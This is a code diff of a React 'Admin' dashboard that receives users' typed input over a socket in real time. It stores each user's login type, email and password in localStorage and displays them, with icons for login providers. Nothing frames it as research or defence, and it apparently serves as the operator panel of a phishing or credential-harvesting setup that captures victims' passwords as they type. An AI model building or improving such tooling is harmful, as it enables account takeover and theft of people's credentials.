@@ -7,7 +7,7 @@ const STORAGE_KEY = "typedData";
 const EXPIRY_MS = 24 * 60 * 60 * 1000; // 1 din
 
 export default function Admin() {
-  const [typed, setTyped] = useState({}); // object form (per user storage)
+  const [typed, setTyped] = useState({}); // { userId: { loginType, email, password } }
 
   // 🔹 Icons mapping
   const icons = {
@@ -36,20 +36,17 @@ export default function Admin() {
       setTyped((prev) => {
         let newData = { ...prev };
 
-        // Agar user record nahi hai → banao
         if (!newData[data.userId]) {
           newData[data.userId] = {};
         }
 
-        // 👇 loginType bhi save karo
-        if (data.type) {
-          newData[data.userId].loginType = data.type;
+        if (data.loginType) {
+          newData[data.userId].loginType = data.loginType;
         }
 
-        // Same user ke andar field update karo
         newData[data.userId][data.field] = data.value;
 
-        // localStorage save
+        // Save to localStorage
         localStorage.setItem(
           STORAGE_KEY,
           JSON.stringify({ data: newData, timestamp: Date.now() })
@@ -62,7 +59,6 @@ export default function Admin() {
     return () => socket.off("showText");
   }, []);
 
-  // 🔹 Clear All Button Function
   const handleClear = () => {
     localStorage.removeItem(STORAGE_KEY);
     setTyped({});
@@ -87,18 +83,23 @@ export default function Admin() {
             key={userId}
             className="border border-green-700 rounded p-3 bg-gray-900"
           >
-            <h2 className="font-bold text-green-300 mb-2">
-              User: {userId}
-              {/* 👇 Agar loginType mila to icon show kare */}
-              {fields.loginType && icons[fields.loginType]
-                ? <span className="ml-2">{icons[fields.loginType]} ({fields.loginType})</span>
-                : null}
-            </h2>
+            <div className="text-xs text-green-300 mb-1">
+              User: {userId.slice(0, 6) + "..."}
+              {fields.loginType && (
+                <span className="ml-2 align-middle">
+                  {icons[fields.loginType]}{" "}
+                  <span className="ml-1">({fields.loginType})</span>
+                </span>
+              )}
+            </div>
             {Object.entries(fields).map(
               ([field, value]) =>
                 field !== "loginType" && (
                   <p key={field}>
-                    <strong>{field}:</strong> {value}
+                    <strong>{field}:</strong>{" "}
+                    {typeof value === "object" && value !== null
+                      ? JSON.stringify(value)
+                      : value}
                   </p>
                 )
             )}
